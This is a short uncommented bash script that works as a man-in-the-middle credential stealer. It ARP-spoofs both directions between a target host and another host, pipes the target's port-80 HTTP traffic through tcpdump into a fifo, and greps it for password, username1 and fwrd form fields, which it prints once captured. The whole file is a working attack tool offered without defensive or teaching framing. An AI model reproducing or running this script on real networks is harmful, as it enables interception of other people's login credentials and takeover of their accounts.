#! /bin/bash

if [ $# -ne 3 ]; then
	exit 1;
fi

fifo=`mktemp --suffix=.fifo -u -p ./`;
mkfifo $fifo;
arpspoof -i $1 -t $2 $3 > /dev/null 2>&1 &
arpspoof -i $1 -t $3 $2 > /dev/null 2>&1 &
tcpdump -Xvv -i $1 -s 0 -U -w $fifo "tcp port 80 and host $2" 2>/dev/null &

exec 0< $fifo;
while read line; do
	password=`echo $line | grep -a -oP "(?<=password=)[0-9a-zA-Z]+"`
	if [ -n "$password" ]; then
		username1=`echo $line | grep -a -oP "(?<=username1=)[0-9]+"`;
		fwrd=`echo $line | grep -a -oP "(?<=fwrd=)[0-9a-zA-Z]+"`;
		if [ -n "$username1" ] && [ -n "$fwrd" ]; then
			break
		fi
	fi
done

jobs -pr | xargs -I {} kill -9 {} 2>/dev/null;
rm $fifo;

if [ -z $password ]; then
	exit 1;
else
	echo "$username1 $password $fwrd";
fi

